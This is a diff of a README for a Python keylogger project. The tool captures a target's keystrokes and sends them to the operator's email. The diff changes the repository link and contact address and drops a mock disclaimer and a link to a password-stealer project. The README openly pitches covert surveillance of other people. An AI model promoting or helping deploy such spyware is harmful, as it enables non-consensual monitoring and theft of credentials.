@@ -1,15 +1,7 @@
 
-# Hey Guys 🤟
+# Hello Git
 
-This is My new project which is a Keylogger, It will capture the target's Typing Keys, and send to your Mail, Use this and Have fun with your friends...🤩
-
-
-## Disclaimer ⚠️
-
-This is only for educational Purpose, If you use this for wrong Purpose, Then we are not responsible for that,
-
- Maattikitta company poruppu illada boys and girls 😼
-
+This is Our new project which is a Keylogger, It will capture the target's Typing Keys, and send to your Mail.
 
 ## Authors
 
@@ -24,7 +16,7 @@ This is only for educational Purpose, If you use this for wrong Purpose, Then we
 To deploy this project run
 
 ```bash
-  git clone https://github.com/flyingculprit/Keylogger.git
+  git clone https://github.com/Navaneethakrishnan2004/Advance-Key-Logger.git
 ```
 Run on terminal or vs code or any Python environment
 ```bash
@@ -43,10 +35,6 @@ Run on terminal or vs code or any Python environment
 
 
 
-## Message to Our Boys and girls
-
-⚠️Safe ah use pannungada Boys and girls...⚡
-
 ## Blog
 
 [Keylogger By SMTP](https://linktodocumentation)
@@ -54,17 +42,8 @@ Run on terminal or vs code or any Python environment
 
 ## Feedback
 
-If you have any feedback, please reach out to us at suryan2021ai@gmail.com
+If you have any feedback, please reach out to us at navaneethakrishnanps2021ai@gmail.com
 
 
-## Related
 
-Here are some related projects
-
-[Saved Password stealar](https://github.com/flyingculprit/fc_script)
-
-
-## Support
-
-For support, email suryan2021ai@gmail.com or join our Telegram channel CYRUSBYTE.
 
